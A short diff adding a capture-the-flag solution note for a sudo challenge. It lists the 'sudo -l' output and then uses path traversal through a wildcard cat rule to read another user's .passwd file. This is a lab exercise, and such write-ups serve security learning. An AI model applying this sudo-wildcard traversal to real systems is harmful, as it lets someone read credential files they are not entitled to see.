@@ -1,0 +1,16 @@
+
+1) get the sudo available configuration
+
+app-script-ch1@challenge02:~/ch1cracked$ sudo -l
+Matching Defaults entries for app-script-ch1 on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user
+
+User app-script-ch1 may run the following commands on this host:
+    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
+
+
+2) use the vulnerability of worst PATH
+
+sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
